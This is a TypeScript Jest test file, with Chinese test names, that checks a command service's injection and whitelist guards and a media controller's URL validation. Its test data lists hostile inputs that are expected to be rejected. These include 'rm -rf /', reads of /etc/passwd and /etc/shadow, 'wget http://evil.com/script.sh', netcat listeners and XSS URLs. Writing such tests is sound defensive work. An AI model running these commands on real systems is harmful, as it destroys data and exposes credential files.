
import { commandService } from '../services/commandService';
import { MediaController } from '../controllers/mediaController';

describe('安全修复测试', () => {
  describe('CommandService 命令注入防护', () => {
    it('应该拒绝包含危险字符的命令', () => {
      const dangerousCommands = [
        'ls; rm -rf /',
        'pwd && cat /etc/passwd',
        'whoami | wc -l',
        'date `whoami`',
        'uptime $(cat /etc/passwd)',
        'free; echo "malicious"',
        'df & echo "attack"',
        'ps | grep root',
        'top `id`',
        'systemctl; rm -rf /',
        'service; cat /etc/shadow',
        'docker; echo "hack"',
        'git; rm -rf .',
        'npm; echo "evil"',
        'node; process.exit(1)'
      ];

      dangerousCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('命令包含危险字符');
      });
    });

    it('应该拒绝包含危险字符的参数', () => {
      const dangerousArgs = [
        'ls --help; rm -rf /',
        'pwd --version && cat /etc/passwd',
        'whoami --help | wc -l',
        'date --help `whoami`',
        'uptime --help $(cat /etc/passwd)',
        'free --help; echo "malicious"',
        'df --help & echo "attack"',
        'ps --help | grep root',
        'top --help `id`',
        'systemctl --help; rm -rf /',
        'service --help; cat /etc/shadow',
        'docker --help; echo "hack"',
        'git --help; rm -rf .',
        'npm --help; echo "evil"',
        'node --help; process.exit(1)'
      ];

      dangerousArgs.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('参数包含危险字符');
      });
    });

    it('应该拒绝不在白名单中的命令', () => {
      const unauthorizedCommands = [
        'rm -rf /',
        'cat /etc/passwd',
        'wget http://evil.com/script.sh',
        'curl http://malicious.com',
        'nc -l 4444',
        'bash -c "echo evil"',
        'sh -c "rm -rf /"',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'perl -e "system(\'rm -rf /\')"',
        'ruby -e "system(\'rm -rf /\')"'
      ];

      unauthorizedCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('不允许执行命令');
      });
    });

    it('应该接受安全的命令', () => {
      const safeCommands = [
        'ls',
        'pwd',
        'whoami',
        'date',
        'uptime',
        'free',
        'df',
        'ps',
        'top',
        'systemctl status',
        'service --status-all',
        'docker ps',
        'git status',
        'npm list',
        'node --version'
      ];

      safeCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('command added');
        expect(result.command).toBe(command);
      });
    });

    it('应该拒绝过长的命令', () => {
      const longCommand = 'ls ' + 'a'.repeat(200);
      const result = commandService.addCommand(longCommand, 'wumy');
      expect(result.status).toBe('error');
      expect(result.message).toContain('命令长度超过限制');
    });
  });

  describe('MediaController URL验证防护', () => {
    it('应该拒绝恶意URL', () => {
      const maliciousUrls = [
        'https://evil.com/pipix.com/fake',
        'http://malicious.com/douyin.com/fake',
        'https://pipix.com.evil.com/fake',
        'http://douyin.com.malicious.com/fake',
        'https://fake-pipix.com/fake',
        'http://fake-douyin.com/fake',
        'ftp://pipix.com/fake',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd'
      ];

      maliciousUrls.forEach(url => {
        const validation = (MediaController as any).validateUrl(url);
        expect(validation.isValid).toBe(false);
        expect(validation.error).toBeDefined();
      });
    });

    it('应该接受有效的URL', () => {
      const validUrls = [
        'https://pipix.com/video/123',
        'http://www.pipix.com/video/456',
        'https://douyin.com/video/789',
        'http://www.douyin.com/video/012',
        'https://pipix.com/share/abc123',
        'http://douyin.com/share/def456'
      ];

      validUrls.forEach(url => {
        const validation = (MediaController as any).validateUrl(url);
        expect(validation.isValid).toBe(true);
      });
    });

    it('应该拒绝无效的URL格式', () => {
      const invalidUrls = [
        'not-a-url',
        'pipix.com',
        'douyin.com',
        'http://',
        'https://',
        '://pipix.com',
        'pipix.com:8080',
        'ftp://pipix.com'
      ];

      invalidUrls.forEach(url => {
        const validation = (MediaController as any).validateUrl(url);
        expect(validation.isValid).toBe(false);
        expect(validation.error).toBeDefined();
      });
    });
  });
}); 